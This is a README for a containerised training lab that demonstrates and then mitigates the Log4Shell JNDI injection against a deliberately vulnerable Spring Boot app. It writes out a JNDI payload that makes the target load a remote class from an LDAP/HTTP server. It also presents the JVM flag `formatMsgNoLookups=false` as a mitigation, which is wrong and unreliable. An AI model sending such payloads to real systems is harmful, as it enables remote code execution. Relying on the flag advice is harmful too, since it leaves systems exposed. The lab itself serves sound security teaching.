
# Log4Shell Exploitation and Mitigation Lab

## Overview

This lab simulates the complete lifecycle of a Log4Shell (CVE-2021-44228) attack scenario and shows how to detect and mitigate it. The lab provides a vulnerable Java Spring Boot application that logs user input unsafely using Log4j v2.14.1, making it susceptible to remote code execution through JNDI injection.

The goal is to:
- Observe the exploit behavior using controlled payloads.
- Apply layered mitigations.
- Verify mitigation effectiveness through retesting.

---

## Architecture

### 🔴 Before Mitigation (Vulnerable State)

- **Spring Boot Application**:
  - Uses **Log4j 2.14.1** for logging.
  - Application endpoint `/api/log` receives untrusted input and logs it with `logger.info(input)`.
  - The log invocation executes unvalidated user input, allowing expression resolution (`${jndi:ldap://...}`) that can trigger a remote class load.

- **LDAP Server**:
  - Built using `marshalsec`, an open-source tool to simulate malicious LDAP-based payload redirection.
  - Returns an LDAP reference to `http://host.docker.internal:8000/Exploit.class`.

- **HTTP Exploit Server**:
  - Runs on Python using `http.server` to serve the Java payload file `Exploit.class`.
  - This payload is dynamically loaded if the vulnerable application executes the JNDI injection.

- **Exploit Delivery**:
  - Delivered via `curl` using a crafted payload that targets `${jndi:ldap://...}`.
  - This triggers the vulnerable logging behavior and attempts to load the remote class.

### 🟢 After Mitigation (Hardened State)

- **Log4j Version Upgrade**:
  - Replaces Log4j 2.14.1 with **Log4j 2.17.0**, which disables remote lookups by default.

- **Input Validation in LogController**:
  - New `LogController.java` performs string sanitization to block `${jndi:` patterns.

- **Secure JVM Flags**:
  - JVM options like `-Dlog4j2.formatMsgNoLookups=false` and LDAP codebase trust flags prevent automatic resolution of remote class payloads.

- **Docker-Based Hardening**:
  - All mitigation changes are applied within Docker to isolate the lab and maintain repeatability.

---

## Setup Instructions

Run the following commands from the root lab folder.

### Step 1: Start the Lab Environment
```bash
make run
```
- Compiles the `Exploit.java` payload.
- Builds and launches all containers (`app`, `ldap-marshalsec`, `http-server`).

### Step 2: Send Exploit Payload
```bash
make curl
```
- Sends `${jndi:ldap://host.docker.internal:1389/a}` to `/api/log` endpoint.

### Step 3: Check Logs
```bash
make logs
```
- Reviews logs from `app`, `ldap-marshalsec`, and `http-server`.
- Confirm LDAP activity or payload delivery.

### Step 4: Full Test Execution
```bash
make test
```
- Executes the payload and verifies LDAP callback through logs.
- Confirms vulnerability exists.

---

## Apply Mitigations

### Step 5: Apply Mitigation Fixes
```bash
make mitigate
```
This action:
- Patches the vulnerable controller with input validation.
- Updates Log4j version in `pom.xml` to 2.17.0.
- Applies hardened JVM options inside Dockerfile and compose environment.

### Step 6: Rebuild Environment
```bash
make rerun
```

### Step 7: Retest for Exploit Behavior
```bash
make retest
```
- Confirms LDAP is no longer invoked.
- Payload is logged as a string instead of being executed.

---

## Optional: Revert to Vulnerable Setup
```bash
make unmitigate
```
- Resets application code and `pom.xml` to Log4j 2.14.1.
- Useful for observing behavior again.

---

## Cleanup Instructions
```bash
make clean
```
- Removes Docker containers, volumes, and compiled exploit artifacts.

---

## Learning Objectives

By completing this lab, you will:

✅ Understand the mechanics of JNDI injection and Log4Shell.  
✅ Observe exploitation of an unpatched Java application.  
✅ Apply defense-in-depth practices:
  - Log4j version upgrades
  - Input validation
  - Safe JVM runtime flags  
✅ Revalidate application behavior after patching.

---

## References

- [CVE-2021-44228 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j 2 Security Vulnerabilities](https://logging.apache.org/log4j/2.x/security.html)
- [marshalsec GitHub](https://github.com/mbechler/marshalsec)
